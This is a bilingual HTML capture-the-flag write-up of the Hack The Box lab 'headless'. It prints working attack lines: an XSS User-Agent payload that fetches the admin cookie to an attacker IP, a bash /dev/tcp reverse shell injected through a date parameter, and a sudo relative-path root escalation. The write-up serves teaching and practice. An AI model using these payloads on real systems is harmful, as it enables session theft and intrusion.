@@ -1,0 +1,480 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>headless | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">headless</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-easy">easy</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine was running a Flask web application with Werkzeug 2.2.2 that included a contact form vulnerable to Cross-Site Scripting (XSS). By injecting a malicious JavaScript payload into the User-Agent header, I was able to steal the administrator's session cookie when they reviewed the submitted form.</p>
+                    
+                    <p>Using the stolen admin cookie, I gained access to the <code>/dashboard</code> endpoint, which contained a date generation feature vulnerable to command injection. By injecting shell commands into the <code>date</code> parameter, I achieved remote code execution as the <code>dvir</code> user.</p>
+                    
+                    <p>For privilege escalation, I discovered that the user had sudo permissions to execute <code>/usr/bin/syscheck</code>, a custom shell script. This script executed <code>./initdb.sh</code> using a relative path without proper validation. By creating a malicious <code>initdb.sh</code> script in the current directory containing a bash shell invocation, I was able to escalate to root when the script was executed with sudo.</p>
+                    
+                    <p><strong>Technologies/Exploits:</strong> Cross-Site Scripting (XSS) via User-Agent header, session hijacking through cookie theft, OS command injection, sudo privilege escalation via relative path exploitation.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with an nmap scan to identify open ports and services running on the target machine:</p>
+                <p><img src="./media/image3.png" alt="Nmap scan results showing open ports including SSH on port 22 and HTTP on port 5000" /></p>
+                
+                <p>The scan reveals two main services: SSH on port 22 and an HTTP server on port 5000. The HTTP server is running Werkzeug 2.2.2, which is a WSGI utility library for Python, typically used with Flask applications.</p>
+                
+                <h2>Web Enumeration</h2>
+                <h3>Main Page</h3>
+                <p>Navigating to the web application on port 5000, I encounter a simple landing page:</p>
+                <p><img src="./media/image4.png" alt="Main landing page of the web application with a simple interface" /></p>
+                
+                <p>The page contains minimal content with a button that leads to a contact form. This is often an interesting attack surface, as forms that process user input can be vulnerable to various injection attacks.</p>
+                
+                <h3>Contact Form Discovery</h3>
+                <p>Clicking on the button takes me to a contact form:</p>
+                <p><img src="./media/image9.png" alt="Contact form with fields for first name, last name, email, phone, and message" /></p>
+                
+                <p>The form includes fields for first name, last name, email, phone number, and a message. Upon submitting the form with test data, there's no visible response or feedback, which suggests the data might be processed in the background or reviewed by an administrator.</p>
+                
+                <h3>Directory Enumeration</h3>
+                <p>Running <code>gobuster</code> to discover hidden directories and endpoints:</p>
+                <pre><code class="language-bash">gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                
+                <p>The scan reveals a <code>/dashboard</code> endpoint that returns a 500 Internal Server Error when accessed via gobuster, but returns a 401 Unauthorized when accessed directly through a browser. This indicates authentication is required to access this endpoint.</p>
+                
+                <h3>Session Cookie Analysis</h3>
+                <p>Inspecting the application's cookies, I find an interesting session cookie:</p>
+                <p><img src="./media/image8.png" alt="Browser developer tools showing the session cookie is_admin set to a JWT-like value" /></p>
+                
+                <p>The cookie named <code>is_admin</code> has a value that looks like a Flask session token. When I remove this cookie and attempt to access <code>/dashboard</code>, I get the 500 error, confirming that the cookie is required for authentication.</p>
+                
+                <p>I initially investigate potential vulnerabilities in Werkzeug 2.2.2. There is a known vulnerability (<a href="https://security.snyk.io/vuln/SNYK-PYTHON-WERKZEUG-3319935">SNYK-PYTHON-WERKZEUG-3319935</a>) related to cookie handling, but it requires control over a subdomain to exploit, which isn't applicable in this scenario.</p>
+                
+                <h2>XSS Attack - Stealing Admin Cookie</h2>
+                <h3>Testing for XSS</h3>
+                <p>Since the contact form appears to be reviewed by an administrator (based on the lack of immediate feedback), I decide to test for Cross-Site Scripting (XSS) vulnerabilities. If successful, I could potentially steal the administrator's session cookie.</p>
+                
+                <p>I start by testing a simple XSS payload in the form fields:</p>
+                <p><img src="./media/image7.png" alt="Contact form filled with XSS test payload including script tags" /></p>
+                
+                <p>After submitting the payload, I receive a message indicating that the request is suspicious and will be reported to the administrator:</p>
+                <p><img src="./media/image5.png" alt="Warning message stating that hacking attempts are detected and will be reported to administrators" /></p>
+                
+                <p>This is actually very promising - it confirms that an administrator reviews flagged submissions, which means XSS is a viable attack vector.</p>
+                
+                <h3>Exploiting User-Agent Header</h3>
+                <p>The interesting discovery here is that I can modify not just the form fields, but also HTTP headers like <code>User-Agent</code> and cookies. Testing with a simple payload in the cookie field:</p>
+                <pre><code class="language-html">&lt;h1&gt;xd&lt;/h1&gt;</code></pre>
+                
+                <p>I observe that the payload gets reflected in the admin's view:</p>
+                <p><img src="./media/image6.png" alt="Admin panel showing the reflected XSS payload in the reported request" /></p>
+                
+                <p>This confirms that the admin panel displays the submitted data, including HTTP headers, without proper sanitization. Now I need to craft a payload that will exfiltrate the admin's cookie to my server.</p>
+                
+                <h3>Cookie Theft Payload</h3>
+                <p>After testing various XSS payloads, I find one that successfully exfiltrates the cookie. I intercept the POST request in Burp Suite and modify the <code>User-Agent</code> header to contain the following payload:</p>
+                <pre><code class="language-http">User-Agent: &lt;script&gt;fetch('http://10.10.14.18?cookie='+document.cookie)&lt;/script&gt;</code></pre>
+                
+                <p>This JavaScript code will execute in the admin's browser context, grab their <code>document.cookie</code>, and send it to my HTTP server running on port 80.</p>
+                
+                <p>Setting up a simple Python HTTP server to receive the stolen cookie:</p>
+                <pre><code class="language-bash">python3 -m http.server 80</code></pre>
+                
+                <p>After submitting the form with the malicious User-Agent, I receive the admin's cookie on my HTTP server:</p>
+                <pre><code class="language-plaintext">10.10.11.8 - - "GET /?cookie=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -</code></pre>
+                
+                <p>The stolen cookie value is: <code>ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code></p>
+                
+                <h2>Accessing the Admin Dashboard</h2>
+                <p>I replace my session cookie with the stolen admin cookie using the browser's developer tools or a browser extension like Cookie-Editor. Now when I navigate to <code>/dashboard</code>, I successfully gain access:</p>
+                <p><img src="./media/image1.png" alt="Admin dashboard showing a date generation feature with a button to generate report" /></p>
+                
+                <p>The dashboard displays a simple interface with functionality to generate system reports based on date parameters.</p>
+                
+                <h2>Command Injection - Gaining Initial Access</h2>
+                <h3>Discovering the Injection Point</h3>
+                <p>I capture the request in Burp Suite when clicking the "Generate Report" button and notice it sends a POST request with a <code>date</code> parameter. Testing for injection vulnerabilities, I try inserting a single quote (<code>'</code>) into the parameter:</p>
+                <pre><code class="language-http">POST /dashboard HTTP/1.1
+Host: 10.10.11.8:5000
+Content-Type: application/x-www-form-urlencoded
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+date=2024-01-01'</code></pre>
+                
+                <p>The response changes when the quote is added - the normal output doesn't appear, suggesting that the input is being interpreted in some way. I test for SQL injection first, but that doesn't yield results. However, when I test for OS command injection, I achieve code execution.</p>
+                
+                <h3>Confirming Command Injection</h3>
+                <p>I test a simple command injection payload to verify I can execute arbitrary commands:</p>
+                <p><img src="./media/image2.png" alt="Burp Suite showing successful command injection with whoami command execution" /></p>
+                
+                <p>The payload structure uses semicolons and newlines to chain commands:</p>
+                <pre><code class="language-http">date=asd;whoami</code></pre>
+                
+                <p>The response confirms that the command executed successfully, returning the username of the running process.</p>
+                
+                <h3>Establishing a Reverse Shell</h3>
+                <p>Now that I've confirmed command injection, I craft a reverse shell payload to gain interactive access. I set up a netcat listener on my attacking machine:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+                
+                <p>Then I inject a bash reverse shell payload through the vulnerable parameter:</p>
+                <pre><code class="language-http">date=asd;%0abash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.18/443+0>%261";%0a</code></pre>
+                
+                <p>Breaking down the payload:</p>
+                <ul>
+                    <li><code>date=asd;</code> - Dummy value to satisfy the expected parameter</li>
+                    <li><code>%0a</code> - URL-encoded newline to separate commands</li>
+                    <li><code>bash -c "bash -i >&amp; /dev/tcp/10.10.14.18/443 0>&amp;1"</code> - Interactive bash shell redirected to my listener</li>
+                    <li>The ampersand (<code>&amp;</code>) is URL-encoded as <code>%26</code></li>
+                </ul>
+                
+                <p>The reverse shell successfully connects, and I gain access as the <code>dvir</code> user. I can now retrieve the user flag from <code>/home/dvir/user.txt</code>.</p>
+                
+                <h2>Privilege Escalation - Exploiting Sudo Permissions</h2>
+                <h3>Checking Sudo Privileges</h3>
+                <p>After gaining initial access, I check what commands the <code>dvir</code> user can run with sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p>The output reveals:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck</code></pre>
+                
+                <p>The user can execute <code>/usr/bin/syscheck</code> as root without a password. This is not a standard Linux utility, so I investigate further.</p>
+                
+                <h3>Analyzing the syscheck Script</h3>
+                <p>First, I check what type of file it is:</p>
+                <pre><code class="language-bash">file /usr/bin/syscheck</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable</code></pre>
+                
+                <p>It's a bash script, so I can read its contents:</p>
+                <pre><code class="language-bash">cat /usr/bin/syscheck</code></pre>
+                
+                <p>The script contents:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+    exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+    /usr/bin/echo "Database service is not running. Starting it..."
+    ./initdb.sh 2>/dev/null
+else
+    /usr/bin/echo "Database service is running."
+fi</code></pre>
+                
+                <h3>Identifying the Vulnerability</h3>
+                <p>The critical vulnerability is in this section:</p>
+                <pre><code class="language-bash">if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+    /usr/bin/echo "Database service is not running. Starting it..."
+    ./initdb.sh 2>/dev/null
+else
+    /usr/bin/echo "Database service is running."
+fi</code></pre>
+                
+                <p>The script executes <code>./initdb.sh</code> using a relative path rather than an absolute path. This means it will look for <code>initdb.sh</code> in the current working directory. Since the script runs as root (via sudo), any commands in our malicious <code>initdb.sh</code> will also execute as root.</p>
+                
+                <p>I search for an existing <code>initdb.sh</code> file on the system:</p>
+                <pre><code class="language-bash">find / -name initdb.sh 2>/dev/null</code></pre>
+                
+                <p>No results are found, confirming that this file doesn't exist anywhere on the system.</p>
+                
+                <h3>Exploiting the Relative Path</h3>
+                <p>I create a malicious <code>initdb.sh</code> script in the <code>dvir</code> user's home directory:</p>
+                <pre><code class="language-bash">cd /home/dvir
+echo '/bin/bash' > initdb.sh
+chmod +x initdb.sh</code></pre>
+                
+                <p>The script simply spawns a bash shell. Since <code>syscheck</code> will run this with root privileges, I'll get a root shell.</p>
+                
+                <p>Now I execute the vulnerable script with sudo from the directory containing my malicious <code>initdb.sh</code>:</p>
+                <pre><code class="language-bash">sudo /usr/bin/syscheck</code></pre>
+                
+                <p>The script output shows:</p>
+                <pre><code class="language-plaintext">Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.7G
+System load average: 0.09, 0.07, 0.01
+Database service is not running. Starting it...</code></pre>
+                
+                <p>At this point, my malicious <code>initdb.sh</code> executes, and I receive a root shell. I can verify this:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>I now have full root access to the system and can retrieve the root flag from <code>/root/root.txt</code>.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo ejecutaba una aplicación web Flask con Werkzeug 2.2.2 que incluía un formulario de contacto vulnerable a Cross-Site Scripting (XSS). Inyectando un payload JavaScript malicioso en la cabecera User-Agent, conseguí robar la cookie de sesión del administrador cuando éste revisaba el formulario enviado.</p>
+                    
+                    <p>Usando la cookie robada del admin, obtuve acceso al endpoint <code>/dashboard</code>, que contenía una funcionalidad de generación de fechas vulnerable a inyección de comandos. Inyectando comandos shell en el parámetro <code>date</code>, logré ejecución remota de código como el usuario <code>dvir</code>.</p>
+                    
+                    <p>Para la escalada de privilegios, descubrí que el usuario tenía permisos sudo para ejecutar <code>/usr/bin/syscheck</code>, un script shell personalizado. Este script ejecutaba <code>./initdb.sh</code> usando una ruta relativa sin validación apropiada. Creando un script <code>initdb.sh</code> malicioso en el directorio actual que contenía una invocación de bash shell, pude escalar a root cuando el script se ejecutó con sudo.</p>
+                    
+                    <p><strong>Tecnologías/Exploits:</strong> Cross-Site Scripting (XSS) mediante cabecera User-Agent, secuestro de sesión mediante robo de cookies, inyección de comandos del sistema operativo, escalada de privilegios mediante sudo explotando rutas relativas.</p>
+                </div>
+                <hr class="summary-divider">
+                
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comienzo con un escaneo de nmap para identificar puertos abiertos y servicios ejecutándose en la máquina objetivo:</p>
+                <p><img src="./media/image3.png" alt="Resultados del escaneo de nmap mostrando puertos abiertos incluyendo SSH en el puerto 22 y HTTP en el puerto 5000" /></p>
+                
+                <p>El escaneo revela dos servicios principales: SSH en el puerto 22 y un servidor HTTP en el puerto 5000. El servidor HTTP ejecuta Werkzeug 2.2.2, que es una librería de utilidades WSGI para Python, típicamente usada con aplicaciones Flask.</p>
+                
+                <h2>Enumeración Web</h2>
+                <h3>Página Principal</h3>
+                <p>Navegando a la aplicación web en el puerto 5000, me encuentro con una página de inicio simple:</p>
+                <p><img src="./media/image4.png" alt="Página de inicio principal de la aplicación web con una interfaz simple" /></p>
+                
+                <p>La página contiene contenido mínimo con un botón que lleva a un formulario de contacto. Esto es a menudo una superficie de ataque interesante, ya que los formularios que procesan entrada de usuario pueden ser vulnerables a varios ataques de inyección.</p>
+                
+                <h3>Descubrimiento del Formulario de Contacto</h3>
+                <p>Clicando en el botón me lleva a un formulario de contacto:</p>
+                <p><img src="./media/image9.png" alt="Formulario de contacto con campos para nombre, apellido, email, teléfono y mensaje" /></p>
+                
+                <p>El formulario incluye campos para nombre, apellido, email, número de teléfono y un mensaje. Al enviar el formulario con datos de prueba, no hay respuesta visible ni feedback, lo que sugiere que los datos podrían procesarse en segundo plano o ser revisados por un administrador.</p>
+                
+                <h3>Enumeración de Directorios</h3>
+                <p>Ejecuto <code>gobuster</code> para descubrir directorios y endpoints ocultos:</p>
+                <pre><code class="language-bash">gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/dirb/common.txt</code></pre>
+                
+                <p>El escaneo revela un endpoint <code>/dashboard</code> que devuelve un error 500 Internal Server Error cuando se accede mediante gobuster, pero devuelve un 401 Unauthorized cuando se accede directamente a través del navegador. Esto indica que se requiere autenticación para acceder a este endpoint.</p>
+                
+                <h3>Análisis de la Cookie de Sesión</h3>
+                <p>Inspeccionando las cookies de la aplicación, encuentro una cookie interesante:</p>
+                <p><img src="./media/image8.png" alt="Herramientas de desarrollo del navegador mostrando la cookie de sesión is_admin establecida con un valor tipo JWT" /></p>
+                
+                <p>La cookie llamada <code>is_admin</code> tiene un valor que parece un token de sesión de Flask. Cuando elimino esta cookie e intento acceder a <code>/dashboard</code>, obtengo el error 500, confirmando que la cookie es necesaria para la autenticación.</p>
+                
+                <p>Inicialmente investigo potenciales vulnerabilidades en Werkzeug 2.2.2. Hay una vulnerabilidad conocida (<a href="https://security.snyk.io/vuln/SNYK-PYTHON-WERKZEUG-3319935">SNYK-PYTHON-WERKZEUG-3319935</a>) relacionada con el manejo de cookies, pero requiere control sobre un subdominio para explotarla, lo que no es aplicable en este escenario.</p>
+                
+                <h2>Ataque XSS - Robando la Cookie del Admin</h2>
+                <h3>Probando XSS</h3>
+                <p>Como el formulario de contacto parece ser revisado por un administrador (basándome en la falta de feedback inmediato), decido probar vulnerabilidades de Cross-Site Scripting (XSS). Si tengo éxito, podría potencialmente robar la cookie de sesión del administrador.</p>
+                
+                <p>Comienzo probando un payload XSS simple en los campos del formulario:</p>
+                <p><img src="./media/image7.png" alt="Formulario de contacto rellenado con payload de prueba XSS incluyendo etiquetas script" /></p>
+                
+                <p>Después de enviar el payload, recibo un mensaje indicando que la petición es sospechosa y será reportada al administrador:</p>
+                <p><img src="./media/image5.png" alt="Mensaje de advertencia indicando que los intentos de hacking son detectados y serán reportados a los administradores" /></p>
+                
+                <p>Esto es realmente prometedor - confirma que un administrador revisa los envíos marcados, lo que significa que XSS es un vector de ataque viable.</p>
+                
+                <h3>Explotando la Cabecera User-Agent</h3>
+                <p>El descubrimiento interesante aquí es que puedo modificar no solo los campos del formulario, sino también cabeceras HTTP como <code>User-Agent</code> y cookies. Probando con un payload simple en el campo de la cookie:</p>
+                <pre><code class="language-html">&lt;h1&gt;xd&lt;/h1&gt;</code></pre>
+                
+                <p>Observo que el payload se refleja en la vista del admin:</p>
+                <p><img src="./media/image6.png" alt="Panel del admin mostrando el payload XSS reflejado en la petición reportada" /></p>
+                
+                <p>Esto confirma que el panel de administración muestra los datos enviados, incluyendo las cabeceras HTTP, sin sanitización apropiada. Ahora necesito crear un payload que exfiltre la cookie del admin a mi servidor.</p>
+                
+                <h3>Payload de Robo de Cookie</h3>
+                <p>Después de probar varios payloads XSS, encuentro uno que exfiltra exitosamente la cookie. Intercepto la petición POST en Burp Suite y modifico la cabecera <code>User-Agent</code> para que contenga el siguiente payload:</p>
+                <pre><code class="language-http">User-Agent: &lt;script&gt;fetch('http://10.10.14.18?cookie='+document.cookie)&lt;/script&gt;</code></pre>
+                
+                <p>Este código JavaScript se ejecutará en el contexto del navegador del admin, capturará su <code>document.cookie</code>, y lo enviará a mi servidor HTTP ejecutándose en el puerto 80.</p>
+                
+                <p>Configurando un servidor HTTP simple de Python para recibir la cookie robada:</p>
+                <pre><code class="language-bash">python3 -m http.server 80</code></pre>
+                
+                <p>Después de enviar el formulario con el User-Agent malicioso, recibo la cookie del admin en mi servidor HTTP:</p>
+                <pre><code class="language-plaintext">10.10.11.8 - - "GET /?cookie=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0 HTTP/1.1" 200 -</code></pre>
+                
+                <p>El valor de la cookie robada es: <code>ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0</code></p>
+                
+                <h2>Accediendo al Dashboard del Admin</h2>
+                <p>Reemplazo mi cookie de sesión con la cookie robada del admin usando las herramientas de desarrollo del navegador o una extensión de navegador como Cookie-Editor. Ahora cuando navego a <code>/dashboard</code>, obtengo acceso exitosamente:</p>
+                <p><img src="./media/image1.png" alt="Dashboard del admin mostrando una funcionalidad de generación de fechas con un botón para generar reporte" /></p>
+                
+                <p>El dashboard muestra una interfaz simple con funcionalidad para generar reportes del sistema basados en parámetros de fecha.</p>
+                
+                <h2>Inyección de Comandos - Obteniendo Acceso Inicial</h2>
+                <h3>Descubriendo el Punto de Inyección</h3>
+                <p>Capturo la petición en Burp Suite cuando clico el botón "Generate Report" y noto que envía una petición POST con un parámetro <code>date</code>. Probando vulnerabilidades de inyección, intento insertar una comilla simple (<code>'</code>) en el parámetro:</p>
+                <pre><code class="language-http">POST /dashboard HTTP/1.1
+Host: 10.10.11.8:5000
+Content-Type: application/x-www-form-urlencoded
+Cookie: is_admin=ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0
+
+date=2024-01-01'</code></pre>
+                
+                <p>La respuesta cambia cuando se añade la comilla - la salida normal no aparece, sugiriendo que la entrada está siendo interpretada de alguna manera. Pruebo primero inyección SQL, pero no da resultados. Sin embargo, cuando pruebo inyección de comandos del SO, logro ejecución de código.</p>
+                
+                <h3>Confirmando Inyección de Comandos</h3>
+                <p>Pruebo un payload simple de inyección de comandos para verificar que puedo ejecutar comandos arbitrarios:</p>
+                <p><img src="./media/image2.png" alt="Burp Suite mostrando inyección de comandos exitosa con ejecución del comando whoami" /></p>
+                
+                <p>La estructura del payload usa punto y coma y saltos de línea para encadenar comandos:</p>
+                <pre><code class="language-http">date=asd;whoami</code></pre>
+                
+                <p>La respuesta confirma que el comando se ejecutó exitosamente, devolviendo el nombre de usuario del proceso en ejecución.</p>
+                
+                <h3>Estableciendo una Reverse Shell</h3>
+                <p>Ahora que he confirmado la inyección de comandos, creo un payload de reverse shell para obtener acceso interactivo. Configuro un listener de netcat en mi máquina atacante:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+                
+                <p>Luego inyecto un payload de reverse shell bash a través del parámetro vulnerable:</p>
+                <pre><code class="language-http">date=asd;%0abash+-c+"bash+-i+>%26+/dev/tcp/10.10.14.18/443+0>%261";%0a</code></pre>
+                
+                <p>Desglosando el payload:</p>
+                <ul>
+                    <li><code>date=asd;</code> - Valor dummy para satisfacer el parámetro esperado</li>
+                    <li><code>%0a</code> - Salto de línea codificado en URL para separar comandos</li>
+                    <li><code>bash -c "bash -i >&amp; /dev/tcp/10.10.14.18/443 0>&amp;1"</code> - Shell bash interactiva redirigida a mi listener</li>
+                    <li>El ampersand (<code>&amp;</code>) está codificado en URL como <code>%26</code></li>
+                </ul>
+                
+                <p>La reverse shell conecta exitosamente, y obtengo acceso como el usuario <code>dvir</code>. Ahora puedo recuperar la flag de usuario desde <code>/home/dvir/user.txt</code>.</p>
+                
+                <h2>Escalada de Privilegios - Explotando Permisos Sudo</h2>
+                <h3>Verificando Privilegios Sudo</h3>
+                <p>Después de obtener el acceso inicial, compruebo qué comandos puede ejecutar el usuario <code>dvir</code> con sudo:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+                
+                <p>La salida revela:</p>
+                <pre><code class="language-plaintext">Matching Defaults entries for dvir on headless:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    use_pty
+
+User dvir may run the following commands on headless:
+    (ALL) NOPASSWD: /usr/bin/syscheck</code></pre>
+                
+                <p>El usuario puede ejecutar <code>/usr/bin/syscheck</code> como root sin contraseña. Esta no es una utilidad estándar de Linux, así que investigo más a fondo.</p>
+                
+                <h3>Analizando el Script syscheck</h3>
+                <p>Primero, compruebo qué tipo de archivo es:</p>
+                <pre><code class="language-bash">file /usr/bin/syscheck</code></pre>
+                
+                <pre><code class="language-plaintext">/usr/bin/syscheck: Bourne-Again shell script, ASCII text executable</code></pre>
+                
+                <p>Es un script bash, así que puedo leer su contenido:</p>
+                <pre><code class="language-bash">cat /usr/bin/syscheck</code></pre>
+                
+                <p>El contenido del script:</p>
+                <pre><code class="language-bash">#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+    exit 1
+fi
+
+last_modified_time=$(/usr/bin/find /boot -name 'vmlinuz*' -exec stat -c %Y {} + | /usr/bin/sort -n | /usr/bin/tail -n 1)
+formatted_time=$(/usr/bin/date -d "@$last_modified_time" +"%d/%m/%Y %H:%M")
+/usr/bin/echo "Last Kernel Modification Time: $formatted_time"
+
+disk_space=$(/usr/bin/df -h / | /usr/bin/awk 'NR==2 {print $4}')
+/usr/bin/echo "Available disk space: $disk_space"
+
+load_average=$(/usr/bin/uptime | /usr/bin/awk -F'load average:' '{print $2}')
+/usr/bin/echo "System load average: $load_average"
+
+if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+    /usr/bin/echo "Database service is not running. Starting it..."
+    ./initdb.sh 2>/dev/null
+else
+    /usr/bin/echo "Database service is running."
+fi</code></pre>
+                
+                <h3>Identificando la Vulnerabilidad</h3>
+                <p>La vulnerabilidad crítica está en esta sección:</p>
+                <pre><code class="language-bash">if ! /usr/bin/pgrep -x "initdb.sh" &>/dev/null; then
+    /usr/bin/echo "Database service is not running. Starting it..."
+    ./initdb.sh 2>/dev/null
+else
+    /usr/bin/echo "Database service is running."
+fi</code></pre>
+                
+                <p>El script ejecuta <code>./initdb.sh</code> usando una ruta relativa en lugar de una ruta absoluta. Esto significa que buscará <code>initdb.sh</code> en el directorio de trabajo actual. Como el script se ejecuta como root (mediante sudo), cualquier comando en nuestro <code>initdb.sh</code> malicioso también se ejecutará como root.</p>
+                
+                <p>Busco un archivo <code>initdb.sh</code> existente en el sistema:</p>
+                <pre><code class="language-bash">find / -name initdb.sh 2>/dev/null</code></pre>
+                
+                <p>No se encuentran resultados, confirmando que este archivo no existe en ningún lugar del sistema.</p>
+                
+                <h3>Explotando la Ruta Relativa</h3>
+                <p>Creo un script <code>initdb.sh</code> malicioso en el directorio home del usuario <code>dvir</code>:</p>
+                <pre><code class="language-bash">cd /home/dvir
+echo '/bin/bash' > initdb.sh
+chmod +x initdb.sh</code></pre>
+                
+                <p>El script simplemente genera una shell bash. Como <code>syscheck</code> ejecutará esto con privilegios de root, obtendré una shell root.</p>
+                
+                <p>Ahora ejecuto el script vulnerable con sudo desde el directorio que contiene mi <code>initdb.sh</code> malicioso:</p>
+                <pre><code class="language-bash">sudo /usr/bin/syscheck</code></pre>
+                
+                <p>La salida del script muestra:</p>
+                <pre><code class="language-plaintext">Last Kernel Modification Time: 01/02/2024 10:05
+Available disk space: 1.7G
+System load average: 0.09, 0.07, 0.01
+Database service is not running. Starting it...</code></pre>
+                
+                <p>En este punto, mi <code>initdb.sh</code> malicioso se ejecuta, y recibo una shell root. Puedo verificar esto:</p>
+                <pre><code class="language-bash">whoami</code></pre>
+                
+                <pre><code class="language-plaintext">root</code></pre>
+                
+                <p>Ahora tengo acceso completo como root al sistema y puedo recuperar la flag de root desde <code>/root/root.txt</code>.</p>
+            </div>
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
